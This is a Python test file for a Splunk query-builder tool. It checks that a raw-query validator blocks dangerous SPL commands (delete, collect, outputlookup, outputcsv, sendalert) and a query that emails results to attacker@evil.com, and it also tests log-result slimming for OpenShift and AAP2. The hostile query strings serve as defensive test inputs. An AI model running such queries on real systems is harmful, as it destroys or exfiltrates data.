"""Extended tests for src/tools/splunk.py — covers _build_raw_query
and remaining query builders."""

from src.tools.splunk import _build_raw_query, _slim_aap2_results, _slim_ocp_results

# ---------------------------------------------------------------------------
# _build_raw_query
# ---------------------------------------------------------------------------


class TestBuildRawQuery:
    def test_valid_search_query(self):
        result = _build_raw_query("search index=main error")
        assert isinstance(result, tuple)
        query, index = result
        assert query == "search index=main error"
        assert index == "custom"

    def test_valid_pipe_query(self):
        result = _build_raw_query("| inputlookup mydata.csv")
        assert isinstance(result, tuple)
        query, index = result
        assert query.startswith("|")

    def test_empty_query_returns_error(self):
        result = _build_raw_query("")
        assert isinstance(result, dict)
        assert "error" in result

    def test_invalid_prefix_returns_error(self):
        result = _build_raw_query("index=main something")
        assert isinstance(result, dict)
        assert "error" in result
        assert "must start with" in result["error"]

    def test_dangerous_delete_blocked(self):
        result = _build_raw_query("search index=main | delete")
        assert isinstance(result, dict)
        assert "Dangerous" in result["error"]

    def test_dangerous_outputlookup_blocked(self):
        result = _build_raw_query("search index=main | outputlookup evil.csv")
        assert isinstance(result, dict)
        assert "Dangerous" in result["error"]

    def test_dangerous_sendalert_blocked(self):
        result = _build_raw_query("search index=main | sendalert myalert")
        assert isinstance(result, dict)
        assert "Dangerous" in result["error"]

    def test_dangerous_collect_blocked(self):
        result = _build_raw_query("search index=main | collect index=evil")
        assert isinstance(result, dict)
        assert "Dangerous" in result["error"]

    def test_dangerous_outputcsv_blocked(self):
        result = _build_raw_query("search index=main | outputcsv data.csv")
        assert isinstance(result, dict)
        assert "Dangerous" in result["error"]

    def test_dangerous_sendemail_blocked(self):
        result = _build_raw_query("search index=main | sendemail to=attacker@evil.com")
        assert isinstance(result, dict)
        assert "Dangerous" in result["error"]

    def test_strips_whitespace(self):
        result = _build_raw_query("  search index=main  ")
        assert isinstance(result, tuple)
        query, _ = result
        assert query == "search index=main"

    def test_case_insensitive_dangerous_check(self):
        result = _build_raw_query("search index=main | DELETE")
        assert isinstance(result, dict)
        assert "Dangerous" in result["error"]


# ---------------------------------------------------------------------------
# _slim_ocp_results
# ---------------------------------------------------------------------------


class TestSlimOcpResults:
    def test_extracts_key_fields(self):
        results = [
            {
                "_time": "2024-01-15T10:30:00",
                "kubernetes.namespace_name": "test-ns",
                "kubernetes.pod_name": "test-pod",
                "kubernetes.container_name": "main",
                "kubernetes.container_image": "quay.io/test:v1",
                "level": "ERROR",
                "message": "connection refused",
                "openshift.labels.cluster_name": "east",
                "_raw": "lots of raw data here",
            }
        ]
        slimmed = _slim_ocp_results(results)
        assert len(slimmed) == 1
        assert slimmed[0]["time"] == "2024-01-15T10:30:00"
        assert slimmed[0]["namespace"] == "test-ns"
        assert slimmed[0]["pod"] == "test-pod"
        assert slimmed[0]["container"] == "main"
        assert slimmed[0]["level"] == "ERROR"
        assert slimmed[0]["message"] == "connection refused"
        assert slimmed[0]["cluster"] == "east"
        assert "_raw" not in slimmed[0]

    def test_empty_results(self):
        assert _slim_ocp_results([]) == []

    def test_missing_fields_default_empty(self):
        results = [{"_time": "2024-01-15"}]
        slimmed = _slim_ocp_results(results)
        assert slimmed[0]["namespace"] == ""
        assert slimmed[0]["pod"] == ""
        assert slimmed[0]["message"] == ""


# ---------------------------------------------------------------------------
# _slim_aap2_results
# ---------------------------------------------------------------------------


class TestSlimAap2Results:
    def test_extracts_key_fields(self):
        results = [
            {
                "_time": "2024-01-15T10:30:00",
                "cluster_host_id": "east.controller.example.com",
                "level": "ERROR",
                "logger_name": "awx.main.tasks",
                "message": "Job failed",
                "_raw": "raw data",
            }
        ]
        slimmed = _slim_aap2_results(results)
        assert len(slimmed) == 1
        assert slimmed[0]["controller"] == "east.controller.example.com"
        assert slimmed[0]["level"] == "ERROR"
        assert slimmed[0]["message"] == "Job failed"
        assert "_raw" not in slimmed[0]

    def test_includes_task_fields_when_present(self):
        results = [
            {
                "_time": "2024-01-15",
                "cluster_host_id": "ctrl",
                "level": "INFO",
                "logger_name": "runner",
                "message": "task started",
                "event_data.task": "Deploy VM",
                "event_data.role": "cloud_deployer",
                "event_data.task_action": "uri",
                "event_data.playbook": "site.yml",
            }
        ]
        slimmed = _slim_aap2_results(results)
        assert slimmed[0]["task"] == "Deploy VM"
        assert slimmed[0]["role"] == "cloud_deployer"
        assert slimmed[0]["playbook"] == "site.yml"

    def test_includes_stdout_truncated(self):
        results = [
            {
                "_time": "2024-01-15",
                "cluster_host_id": "ctrl",
                "level": "INFO",
                "logger_name": "runner",
                "message": "output",
                "stdout": "x" * 5000,
            }
        ]
        slimmed = _slim_aap2_results(results)
        assert len(slimmed[0]["stdout"]) == 2000

    def test_no_task_or_stdout_omitted(self):
        results = [
            {
                "_time": "2024-01-15",
                "cluster_host_id": "ctrl",
                "level": "INFO",
                "logger_name": "runner",
                "message": "ok",
            }
        ]
        slimmed = _slim_aap2_results(results)
        assert "task" not in slimmed[0]
        assert "stdout" not in slimmed[0]

    def test_empty_results(self):
        assert _slim_aap2_results([]) == []
